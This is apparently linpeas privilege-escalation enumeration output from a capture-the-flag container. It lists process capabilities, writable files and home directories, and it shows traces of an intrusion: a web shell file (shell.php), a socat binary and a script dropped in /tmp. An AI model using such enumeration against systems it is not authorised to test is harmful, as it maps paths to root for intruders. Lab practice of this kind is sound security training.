+CapEff:  [Invalid capability format]
+./linpeas.sh: 8622: [[: not found
+CapBnd:  [Invalid capability format]
+./linpeas.sh: 8622: [[: not found
+CapAmb:  [Invalid capability format]
+
+╚ Parent process capabilities
+./linpeas.sh: 8647: [[: not found                                                                                                                                     
+CapInh:  [Invalid capability format]
+./linpeas.sh: 8647: [[: not found
+CapPrm:  [Invalid capability format]
+./linpeas.sh: 8638: [[: not found
+CapEff:  [Invalid capability format]
+./linpeas.sh: 8647: [[: not found
+CapBnd:  [Invalid capability format]
+./linpeas.sh: 8647: [[: not found
+CapAmb:  [Invalid capability format]
+
+══╣ Processes with capability sets (non-zero CapEff/CapAmb, limit 40)
+PID 1 (bash) user=root
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+PID 26 (apache2) user=root
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+PID 418 (su) user=www-data
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+PID 433 (sudo) user=adalberto
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+PID 434 (sudo) user=adalberto
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+PID 435 (below) user=root
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+PID 1843 (su) user=www-data
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+PID 3749 (su) user=www-data
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+PID 8885 (su) user=www-data
+  CapInh: 0x0000000000000000=
+  CapPrm: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapEff: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapBnd: 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+  CapAmb: 0x0000000000000000=
+
+
+
+Files with capabilities (limited to 50):
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+
+╔══════════╣ Users with capabilities
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                        
+
+╚ Checking if PAM loads pam_cap.so
+/etc/pam.d/common-auth:25:auth  optional                        pam_cap.so                                                                                            
+
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                                
+/etc/ld.so.conf                                                                                                                                                       
+Content of /etc/ld.so.conf:                                                                                                                                           
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/libc.conf                                                                                                                                         
+  - /usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+  - /lib/x86_64-linux-gnu
+  - /usr/lib/x86_64-linux-gnu
+
+/etc/ld.so.preload
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                      
+total 12                                                                                                                                                              
+drwxr-xr-x 2 root root 4096 May 28  2025 .
+drwxr-xr-x 1 root root 4096 Feb 14 13:12 ..
+-rw-r--r-- 1 root root   96 Apr 22  2024 01-locale-fix.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                          
+
+╔══════════╣ AppArmor binary profiles
+-rw-r--r-- 1 root root 2006 Nov 19 12:50 usr.sbin.mysqld                                                                                                              
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No                                                                                                                          
+═╣ Credentials in fstab/mtab? ........... No                                                                                                                          
+═╣ Can I read shadow files? ............. No                                                                                                                          
+═╣ Can I read shadow plists? ............ No                                                                                                                          
+═╣ Can I write shadow plists? ........... No                                                                                                                          
+═╣ Can I read opasswd file? ............. No                                                                                                                          
+═╣ Can I write in network-scripts? ...... No                                                                                                                          
+═╣ Can I read root folder? .............. No                                                                                                                          
+                                                                                                                                                                      
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/home/adalberto/flag.txt
+/root/
+/var/www
+/var/www/html
+/var/www/html/index.html
+/var/www/blogo
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+-rw-r--r-- 1 root root 53 Jan 15 13:00 /home/adalberto/flag.txt
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                      
+/home/adalberto
+/run/lock
+/tmp
+/tmp/socat
+/tmp/socat.1
+/tmp/x.sh
+/var/lib/php/sessions
+/var/log/below
+/var/log/below/error_root.log
+/var/tmp
+/var/www/blogo
+/var/www/blogo/files
+/var/www/blogo/linpeas.sh
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                      
+  Group adalberto:
+/tmp/socat.1
+/tmp/socat
+/tmp/x.sh
+/var/www/blogo/linpeas.sh
+
+
+╔══════════╣ Writable root-owned executables I can modify (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                      
+Writable root-owned executables Not Found
+                                                                                                                                                                      
+
+
+                            ╔═════════════════════════╗
+════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                   
+                            ╚═════════════════════════╝                                                                                                               
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                              
+
+╔══════════╣ Executable files potentially added by user (limit 70)
+2026-02-14+13:25:14.9624726980 /tmp/socat
+2026-02-14+13:16:41.0046154580 /tmp/x.sh
+2026-02-14+13:12:49.2498945670 /.dockerenv
+
+╔══════════╣ Unexpected in root
+/.dockerenv                                                                                                                                                           
+/flag.txt
+/lib.usr-is-merged
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/home/adalberto/.gnupg/pubring.kbx
+/home/adalberto/.gnupg/trustdb.gpg
+
+╔══════════╣ Syslog configuration (limit 50)
+syslog configuration Not Found                                                                                                                                        
+╔══════════╣ Auditd configuration (limit 50)                                                                                                                          
+auditd configuration Not Found                                                                                                                                        
+╔══════════╣ Log files with potentially weak perms (limit 50)                                                                                                         
+   262786    140 -rw-r-----   1 root     adm        143208 Jan 14 23:19 /var/log/apt/term.log
+
+╔══════════╣ Files inside /home/adalberto (limit 20)
+total 48                                                                                                                                                              
+drwxr-x--- 1 adalberto adalberto 4096 Feb 14 13:43 .
+drwxr-xr-x 1 root      root      4096 Jan 12 17:24 ..
+-rw------- 1 adalberto adalberto    6 Jan 16 11:01 .bash_history
+-rw-r--r-- 1 adalberto adalberto  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 adalberto adalberto 3792 Jan 12 17:24 .bashrc
+drwxrwxr-x 1 adalberto adalberto 4096 Jan 12 17:27 .cargo
+drwx------ 3 adalberto adalberto 4096 Feb 14 13:44 .gnupg
+-rw-r--r-- 1 adalberto adalberto  828 Jan 12 17:24 .profile
+drwxrwxr-x 6 adalberto adalberto 4096 Jan 12 17:25 .rustup
+-rw-rw-r-- 1 adalberto adalberto  215 Feb 14 13:40 .wget-hsts
+-rw-r--r-- 1 root      root        53 Jan 15 13:00 flag.txt
+
+╔══════════╣ Files inside others home (limit 20)
+/var/www/html/index.html
+/var/www/blogo/festas-ano-novo.png
+/var/www/blogo/index.html
+/var/www/blogo/test.txt
+/var/www/blogo/test.php
+/var/www/blogo/aetherpharma.png
+/var/www/blogo/noticias.php
+/var/www/blogo/back.zip
+/var/www/blogo/config/config.php
+/var/www/blogo/files/settings.json
+/var/www/blogo/files/test.txt
+/var/www/blogo/files/test.php
+/var/www/blogo/shell.php
+/var/www/blogo/linpeas.sh
+
+╔══════════╣ Searching installed mail applications
+                                                                                                                                                                      
+╔══════════╣ Mails (limit 50)
+                                                                                                                                                                      
+╔══════════╣ Backup folders
+drwxr-xr-x 2 root root 4096 Apr 22  2024 /var/backups                                                                                                                 
+total 0
+
+
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 root root 365 Jan 11 16:18 /etc/xml/polkitd.xml.old
+-rw-r--r-- 1 root root 893 Jan 11 16:18 /etc/xml/catalog.old
+-rw-r--r-- 1 root root 673 Jan 11 16:18 /etc/xml/xml-core.xml.old
+-rw-r--r-- 1 root root 61 Jan 11 14:32 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
+-rw-r--r-- 1 root root 0 May 28  2025 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
+-rw-r--r-- 1 root root 128 Jan 11 16:18 /var/lib/sgml-base/supercatalog.old
+-rw-r--r-- 1 root root 154 Sep 26  2024 /usr/lib/systemd/system/dpkg-db-backup.timer
+-rw-r--r-- 1 root root 147 Sep 26  2024 /usr/lib/systemd/system/dpkg-db-backup.service
+-rw-r--r-- 1 root root 43552 Nov 19 12:50 /usr/lib/mysql/plugin/component_mysqlbackup.so
+-rwxr-xr-x 1 root root 2586 Sep 18 14:43 /usr/libexec/dpkg/dpkg-db-backup
+
+
+╔══════════╣ Web files?(output limit)
+/var/www/:
+total 24K
+drwxr-xr-x 1 root root 4.0K Jan 14 14:24 .
+drwxr-xr-x 1 root root 4.0K Jan  7 19:05 ..
+drwxrwxrwx 1 root root 4.0K Feb 14 13:40 blogo
+drwxr-xr-x 2 root root 4.0K Jan  7 19:09 html
+
+/var/www/blogo:
+total 1.7M
+drwxrwxrwx 1 root      root      4.0K Feb 14 13:40 .
+
+╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw------- 1 root root 0 May 28  2025 /etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Mar 31  2024 /etc/skel/.bash_logout
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/embedded-book/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/rustdoc/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 0 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/.lock
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/error_codes/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/rust-by-example/ja/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/rust-by-example/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/rust-by-example/zh/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/edition-guide/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/unstable-book/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/rustc/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/book/first-edition/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/book/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/book/2018-edition/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/book/second-edition/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/clippy/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/cargo/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/style-guide/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/nomicon/.nojekyll
+-rw-r--r-- 1 adalberto adalberto 72 Jan 12 17:25 /home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/reference/.nojekyll
+-rw-rw-r-- 1 adalberto adalberto 87 Jan 12 17:29 /home/adalberto/.cargo/.crates.toml
+-rw-r--r-- 1 adalberto adalberto 90112 Jan 12 17:27 /home/adalberto/.cargo/.global-cache
+-rw-rw-r-- 1 adalberto adalberto 459 Jan 12 17:29 /home/adalberto/.cargo/.crates2.json
+-rw-r--r-- 1 adalberto adalberto 106 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/cursive_core-0.3.7/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/cursive_core-0.3.7/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 109 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/signal-hook-mio-0.2.5/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/signal-hook-mio-0.2.5/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/linux-raw-sys-0.11.0/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/linux-raw-sys-0.11.0/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Jul 23  2006 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/unicase-2.9.0/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/unicase-2.9.0/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/terminal_size-0.4.3/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/terminal_size-0.4.3/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 51 Jul 23  2006 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/iana-time-zone-0.1.64/.clippy.toml
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/iana-time-zone-0.1.64/.cargo_vcs_info.json
+-rw-r--r-- 1 adalberto adalberto 121 Jul 23  2006 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/iana-time-zone-0.1.64/.clang-format
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/iana-time-zone-0.1.64/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/num_threads-0.1.7/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/num_threads-0.1.7/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/winnow-0.7.14/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/winnow-0.7.14/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 101 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/cursive-0.20.0/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/cursive-0.20.0/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 103 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/zstd-safe-7.2.4/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/zstd-safe-7.2.4/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/num-traits-0.2.19/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/num-traits-0.2.19/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/anyhow-1.0.100/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/anyhow-1.0.100/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 106 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/fb_procfs-0.8.1/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/fb_procfs-0.8.1/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 104 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rayon-core-1.13.0/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rayon-core-1.13.0/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 110 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/toml_edit-0.22.27/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/toml_edit-0.22.27/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/shlex-1.3.0/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/shlex-1.3.0/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 106 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/tokio-macros-2.6.0/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/tokio-macros-2.6.0/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/thread_local-1.1.9/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/thread_local-1.1.9/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Jul 23  2006 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.149/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.149/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/strsim-0.11.1/.cargo_vcs_info.json
+-rw-r--r-- 1 adalberto adalberto 213 Jul 23  2006 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/strsim-0.11.1/.editorconfig
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/strsim-0.11.1/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 113 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/indicatif-0.17.11/.cargo_vcs_info.json
+-rw-rw-r-- 1 adalberto adalberto 7 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/indicatif-0.17.11/.cargo-ok
+-rw-r--r-- 1 adalberto adalberto 94 Dec 31  1969 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/num-iter-0.1.45/.cargo_vcs_info.json
+grep: write error: Broken pipe
+grep: write error: Broken pipe
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rw-rw-r-- 1 adalberto adalberto 375176 Feb 14 13:27 /tmp/socat.1                                                                                                     
+-rwxrwxr-x 1 adalberto adalberto 375176 Feb 14 13:25 /tmp/socat
+-rwxrwxr-x 1 adalberto adalberto 32 Feb 14 13:16 /tmp/x.sh
+
+╔══════════╣ Searching passwords in history files
+                                                                                                                                                                      
+╔══════════╣ Searching passwords in config PHP files
+                                                                                                                                                                      
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
